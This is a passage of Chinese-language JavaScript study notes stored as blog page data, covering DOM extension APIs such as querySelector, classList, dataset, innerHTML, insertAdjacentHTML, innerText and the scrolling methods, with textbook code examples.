class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.innerHTML = <span class=\"string\">\"Hello world!\"</span>;</span><br><span class=\"line\">div.innerHTML = <span class=\"string\">\"Hello &amp; welcome, &lt;b&gt;\\\"reader\\\"!&lt;/b&gt;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 以上操作得到的结果如下:</span></span><br><span class=\"line\"><span class=\"comment\">// &lt;div id=\"content\"&gt;Hello &amp;amp; welcome, &lt;b&gt;&amp;quot;reader&amp;quot;!&lt;/b&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>\n<p>不支持 innerHTML 的元素有:<code>&lt;col&gt;、&lt;colgroup&gt;、 &lt;frameset&gt;、&lt;head&gt;、&lt;html&gt;、&lt;style&gt;、&lt;table&gt;、&lt;tbody&gt;、&lt;thead&gt;、&lt;tfoot&gt;和&lt;tr&gt;</code>。</p>\n<p>无论什么时候，只要使用 innerHTML 从外部插入 HTML，都应该首先以可靠的方式处理 HTML。</p>\n<h4 id=\"outerHTML-属性\"><a href=\"#outerHTML-属性\" class=\"headerlink\" title=\"outerHTML 属性\"></a>outerHTML 属性</h4><p>用法与innerHTML类似，只是包含调用元素。</p>\n<h4 id=\"insertAdjacentHTML-方法\"><a href=\"#insertAdjacentHTML-方法\" class=\"headerlink\" title=\"insertAdjacentHTML()方法\"></a>insertAdjacentHTML()方法</h4><p>两个参数:插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一:</p>\n<ul>\n<li>“beforebegin”，在当前元素之前插入一个紧邻的同辈元素; </li>\n<li>“afterbegin”，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素;</li>\n<li>“beforeend”，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素;</li>\n<li>“afterend”，在当前元素之后插入一个紧邻的同辈元素。</li>\n</ul>\n<p>第二个参数是一个HTML字符串：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//作为前一个同辈元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"beforebegin\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为第一个子元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"afterbegin\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为最后一个子元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"beforeend\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//作为后一个同辈元素插入</span></span><br><span class=\"line\">element.insertAdjacentHTML(<span class=\"string\">\"afterend\"</span>, <span class=\"string\">\"&lt;p&gt;Hello world!&lt;/p&gt;\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"内存与性能问题\"><a href=\"#内存与性能问题\" class=\"headerlink\" title=\"内存与性能问题\"></a>内存与性能问题</h4><p>在使用 innerHTML、 outerHTML 属性和 insertAdjacentHTML()方法时，最好先手工删除要被替换的元素的所有事件处理 程序和 JavaScript 对象属性(第 13 章将进一步讨论事件处理程序)。</p>\n<p>另外，对于DOM操作，尽量减少次数，例如下面示例：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=values.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  ul.innerHTML += <span class=\"string\">\"&lt;li&gt;\"</span> + values[i] + <span class=\"string\">\"&lt;/li&gt;\"</span>; <span class=\"comment\">//要避免这种频繁操作!!</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 应该如下处理</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> itemsHtml = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=values.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  itemsHtml += <span class=\"string\">\"&lt;li&gt;\"</span> + values[i] + <span class=\"string\">\"&lt;/li&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ul.innerHTML = itemsHtml;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"scrollIntoView-方法（了解）\"><a href=\"#scrollIntoView-方法（了解）\" class=\"headerlink\" title=\"scrollIntoView()方法（了解）\"></a>scrollIntoView()方法（了解）</h3><p>scrollIntoView()可以在所有 HTML 元素上调用，通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中。如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中，(可能的话，调用元素的底部会与视口顶部平齐。)不过顶部不一定平齐，例如:<br>//让元素可见 document.forms[0].scrollIntoView();<br>当页面发生变化时，一般会用这个方法来吸引用户的注意力。实际上，为某个元素设置焦点也会导 致浏览器滚动并显示出获得焦点的元素。<br>支持 scrollIntoView()方法的浏览器有 IE、Firefox、Safari 和 Opera。</p>\n<h2 id=\"专有扩展\"><a href=\"#专有扩展\" class=\"headerlink\" title=\"专有扩展\"></a>专有扩展</h2><h3 id=\"文档模式\"><a href=\"#文档模式\" class=\"headerlink\" title=\"文档模式\"></a>文档模式</h3><p>IE可以设置文档模式：<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 语法 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"IE=IEVersion\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 示例 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"IE=Edge\"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 获得文档模式</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mode = <span class=\"built_in\">document</span>.documentMode;</span><br></pre></td></tr></table></figure>\n<h3 id=\"children属性\"><a href=\"#children属性\" class=\"headerlink\" title=\"children属性\"></a>children属性</h3><p>这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外， children 属性与 childNodes 没有什么区别</p>\n<h3 id=\"contains-方法\"><a href=\"#contains-方法\" class=\"headerlink\" title=\"contains()方法\"></a>contains()方法</h3><p>判断某个节点是不是另一个节点的后代。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">document</span>.documentElement.contains(<span class=\"built_in\">document</span>.body)); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure></p>\n<p>使用 DOM Level 3 compareDocumentPosition()也能够确定节点间的关系。</p>\n<p>通用的contains函数：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">contains</span>(<span class=\"params\">refNode, otherNode</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> refNode.contains == <span class=\"string\">\"function\"</span> &amp;&amp;</span><br><span class=\"line\">          (!client.engine.webkit || client.engine.webkit &gt;= <span class=\"number\">522</span>))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> refNode.contains(otherNode);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> refNode.compareDocumentPosition == <span class=\"string\">\"function\"</span>)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> !!(refNode.compareDocumentPosition(otherNode) &amp; <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> node = otherNode.parentNode;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (node === refNode)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            node = node.parentNode;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span> (node !== <span class=\"literal\">null</span>);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"插入文本\"><a href=\"#插入文本\" class=\"headerlink\" title=\"插入文本\"></a>插入文本</h3><h4 id=\"innerText-属性\"><a href=\"#innerText-属性\" class=\"headerlink\" title=\"innerText 属性\"></a>innerText 属性</h4><p>通过 innertText 属性可以操作元素中包含的所有文本内容，包括子文档树中的文本。</p>\n<p>可以通过 innerText 属性过滤掉 HTML 标签：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.innerText = div.innerText;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 兼容函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInnerText</span>(<span class=\"params\">element</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"keyword\">typeof</span> element.textContent == <span class=\"string\">\"string\"</span>) ?</span><br><span class=\"line\">        element.textContent : element.innerText;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setInnerText</span>(<span class=\"params\">element, text</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> element.textContent == <span class=\"string\">\"string\"</span>)&#123;</span><br><span class=\"line\">        element.textContent = text;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        element.innerText = text;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"outerText-属性\"><a href=\"#outerText-属性\" class=\"headerlink\" title=\"outerText 属性\"></a>outerText 属性</h4><p>除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。</p>\n<h3 id=\"滚动\"><a href=\"#滚动\" class=\"headerlink\" title=\"滚动\"></a>滚动</h3><ul>\n<li>scrollIntoViewIfNeeded(alignCenter):只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部(垂直方向)。 10 Safari 和 Chrome 实现了这个方法。</li>\n<li>scrollByLines(lineCount):将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。</li>\n<li>scrollByPages(pageCount):将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。</li>\n</ul>\n<p>希望大家要注意的是，scrollIntoView()和scrollIntoViewIfNeeded()的作用对象是元素的 容器，而 scrollByLines()和 scrollByPages()影响的则是元素自身。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//将页面主体滚动 </span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.scrollByLines(<span class=\"number\">5</span>);</span><br><span class=\"line\"><span class=\"comment\">//在当前元素不可见的时候，让它进入浏览器的视口</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.images[<span class=\"number\">0</span>].scrollIntoViewIfNeeded();</span><br><span class=\"line\"><span class=\"comment\">//将页面主体往回滚动</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.scrollByPages(<span class=\"number\">-1</span>);</span><br></pre></td></tr></table></figure></p>\n<p>由于 scrollIntoView()是唯一一个所有浏览器都支持的方法，因此还是这个方法最常用。</p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1>","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>重点掌握</p>\n<ol>\n<li>选择符API<br><code>querySelector,querySelectorAll,matchesSelector</code></li>\n<li>元素遍历<br><code>childElementCount,firstElementChild,lastElementChild,previouseElementSibling,nextElementSibling</code></li>\n<li>其他<br><code>getElementsByClassName,classList,activeElement,hasFocus,readyState,compatMode,head,charset,innerHTML,innerText</code></li>\n</ol>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"选择符-API\"><a href=\"#选择符-API\" class=\"headerlink\" title=\"选择符 API\"></a>选择符 API</h2><p>querySelector()方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，返回 null。</p>\n<p>querySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 类 NodeList 的实例，但是是快照非动态查询。</p>\n<p>Selectors API Level 2规范为Element类型新增了一个方法matchesSelector()。这个方法接收 一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true;否则，返回 false。看例子。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.body.matchesSelector(<span class=\"string\">\"body.page1\"</span>))&#123;</span><br><span class=\"line\">  <span class=\"comment\">//true</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 兼容写法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">matchesSelector</span>(<span class=\"params\">element, selector</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (element.matchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.matchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.msMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.msMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.mozMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.mozMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.webkitMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.webkitMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Not supported.\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (matchesSelector(<span class=\"built_in\">document</span>.body, <span class=\"string\">\"body.page1\"</span>))&#123; <span class=\"comment\">//执行操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"元素遍历\"><a href=\"#元素遍历\" class=\"headerlink\" title=\"元素遍历\"></a>元素遍历</h2><p>Element Traversal API 为 DOM 元素添加了以下 5 个属性。</p>\n<ul>\n<li>childElementCount:返回子元素(不包括文本节点和注释)的个数。</li>\n<li>firstElementChild:指向第一个子元素;firstChild 的元素版。</li>\n<li>lastElementChild:指向最后一个子元素;lastChild 的元素版。</li>\n<li>previousElementSibling:指向前一个同辈元素;previousSibling 的元素版。 </li>\n<li>nextElementSibling:指向后一个同辈元素;nextSibling 的元素版。</li>\n</ul>\n<p>兼容性：IE 9+、Firefox 3.5+、Safari 4+、Chrome 和 Opera 10+</p>\n<h2 id=\"HTML5\"><a href=\"#HTML5\" class=\"headerlink\" title=\"HTML5\"></a>HTML5</h2><h3 id=\"getElementsByClassName-方法\"><a href=\"#getElementsByClassName-方法\" class=\"headerlink\" title=\"getElementsByClassName()方法\"></a>getElementsByClassName()方法</h3><p>getElementsByClassName()方法接收一个参数，即一个包含一或多个类名的字符串，返回带有 指定类的所有元素的 NodeList。传入多个类名时，类名的先后顺序不重要。注意，同样可能涉及性能问题。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> allCurrentUsernames = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"username current\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"classList-属性\"><a href=\"#classList-属性\" class=\"headerlink\" title=\"classList 属性\"></a>classList 属性</h3><p>这个 classList 属性是新集合类型 DOMTokenList 的实例。与其他 DOM 集合类似，有length属性，每个元素可以用item()方法或者方括号语法访问。</p>\n<p> add(value):将给定的字符串值添加到列表中。如果值已经存在，就不添加了。<br> contains(value):表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 2  remove(value):从列表中删除给定的字符串。<br> toggle(value):如果列表中已经存在给定的值，删除它;如果列表中没有给定的值，添加它。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//删除\"disabled\"类 </span></span><br><span class=\"line\">div.classList.remove(<span class=\"string\">\"disabled\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//添加\"current\"类 </span></span><br><span class=\"line\"> div.classList.add(<span class=\"string\">\"current\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//切换\"user\"类 </span></span><br><span class=\"line\">div.classList.toggle(<span class=\"string\">\"user\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//确定元素中是否包含既定的类名</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (div.classList.contains(<span class=\"string\">\"bd\"</span>) &amp;&amp; !div.classList.contains(<span class=\"string\">\"disabled\"</span>))&#123;</span><br><span class=\"line\">  <span class=\"comment\">//执行操作 </span></span><br><span class=\"line\">)</span><br><span class=\"line\"> <span class=\"comment\">//迭代类名</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=div.classList.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  doSomething(div.classList[i]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>兼容性： Firefox 3.6+和 Chrome。</p>\n<h3 id=\"焦点管理\"><a href=\"#焦点管理\" class=\"headerlink\" title=\"焦点管理\"></a>焦点管理</h3><p>document.activeElement,document.hasFocus()</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myButton\"</span>);</span><br><span class=\"line\">button.focus();</span><br><span class=\"line\">alert(<span class=\"built_in\">document</span>.activeElement === button);   <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myButton\"</span>);</span><br><span class=\"line\">button.focus();</span><br><span class=\"line\">alert(<span class=\"built_in\">document</span>.hasFocus());  <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>兼容性：IE 4+、Firefox 3+、Safari 4+、Chrome 和 Opera 8+</p>\n<h3 id=\"HTMLDocument的变化\"><a href=\"#HTMLDocument的变化\" class=\"headerlink\" title=\"HTMLDocument的变化\"></a>HTMLDocument的变化</h3><p>readyState 属性<br>Document 的 readyState 属性有两个可能的值:</p>\n<ul>\n<li>loading，正在加载文档;</li>\n<li>complete，已经加载完文档。<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.readyState == <span class=\"string\">\"complete\"</span>)&#123; </span><br><span class=\"line\">  <span class=\"comment\">//执行操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>兼容模式<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.compatMode == <span class=\"string\">\"CSS1Compat\"</span>)&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Standards mode\"</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Quirks mode\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>head属性<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.head || <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"字符集属性\"><a href=\"#字符集属性\" class=\"headerlink\" title=\"字符集属性\"></a>字符集属性</h3><p>charset 和 defaultCharset<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">document</span>.charset); <span class=\"comment\">//\"UTF-16\"</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.charset = <span class=\"string\">\"UTF-8\"</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"自定义数据属性\"><a href=\"#自定义数据属性\" class=\"headerlink\" title=\"自定义数据属性\"></a>自定义数据属性</h3><p>以data-开头，用元素的dataset属性访问。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"myDiv\"</span> data-appId=<span class=\"string\">\"12345\"</span> data-myname=<span class=\"string\">\"Nicholas\"</span>&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//本例中使用的方法仅用于演示</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//取得自定义属性的值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> appId = div.dataset.appId; <span class=\"keyword\">var</span> myName = div.dataset.myname;</span><br><span class=\"line\"><span class=\"comment\">//设置值</span></span><br><span class=\"line\">div.dataset.appId = <span class=\"number\">23456</span>; div.dataset.myname = <span class=\"string\">\"Michael\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//有没有\"myname\"值呢?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (div.dataset.myname)&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"Hello, \"</span> + div.dataset.myname);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"插入标记\"><a href=\"#插入标记\" class=\"headerlink\" title=\"插入标记\"></a>插入标记</h3><h4 id=\"innerHTML-属性\"><a href=\"#innerHTML-属性\" class=\"headerlink\" title=\"innerHTML 属性\"></a>innerHTML 属性</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">div.innerHTML = <span class=\"string\">\"Hello world!\"</span>;</span><br><span class=\"line\">div.innerHTML = <span class=\"string\">\"Hello &amp; welcome, &lt;b&gt;\\\"reader\\\"!&lt;/b&gt;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 以上操作得到的结果如下:</span></span><br><span class=\"line\"><span class=\"comment\">// &lt;div id=\"content\"&gt;Hello &amp;amp; welcome, &lt;b&gt;&amp;quot;reader&amp;quot;!&lt;/b&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>\n<p>不支持 innerHTML 的元素有:<code>&lt;col&gt;、&lt;colgroup&gt;、 &lt;frameset&gt;、&lt;head&gt;、&lt;html&gt;、&lt;style&gt;、&lt;table&gt;、&lt;tbody&gt;、&lt;thead&gt;、&lt;tfoot&gt;和&lt;tr&gt;</code>。</p>\n<p>无论什么时候，只要使用 innerHTML 从外部插入 HTML，都应该首先以可靠的方式处理 HTML。</p>\n<h4 id=\"outerHTML-属性\"><a href=\"#outerHTML-属性\" class=\"headerlink\" title=\"outerHTML 属性\"></a>outerHTML 属性</h4><p>用法与innerHTML类似，只是包含调用元素。</p>\n<h4 id=\"insertAdjacentHTML-方法\"><a href=\"#insertAdjacentHTML-方法\" class=\"headerlink\" 